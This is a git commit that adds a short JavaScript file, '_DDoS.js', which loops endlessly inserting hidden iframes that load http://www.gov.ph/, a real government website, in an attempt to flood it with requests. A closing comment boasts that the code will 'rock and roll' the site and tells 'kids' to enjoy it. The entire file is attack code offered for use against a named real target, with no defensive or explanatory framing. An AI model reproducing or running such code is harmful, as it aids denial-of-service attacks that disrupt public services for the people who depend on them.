6107b9ad47ff079abbeb229e2fc3381980c851e7
owersite <60113773+owersite@users.noreply.github.com>
2021-04-04 12:18:36 +0200

    Create _DDoS.js

---
+++ testing/dos/_DDoS.js
@@ -0,0 +1,12 @@
+function _DDoS(url){
+ document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
+}
+for(;;){
+ setTimeout('_DDoS("http://www.gov.ph/")',10);
+}
+
+/* This code will take a **
+** rock and roll with the**
+** site www.gov.ph       **
+** \m/ Enjoy this kids.  **
+*/
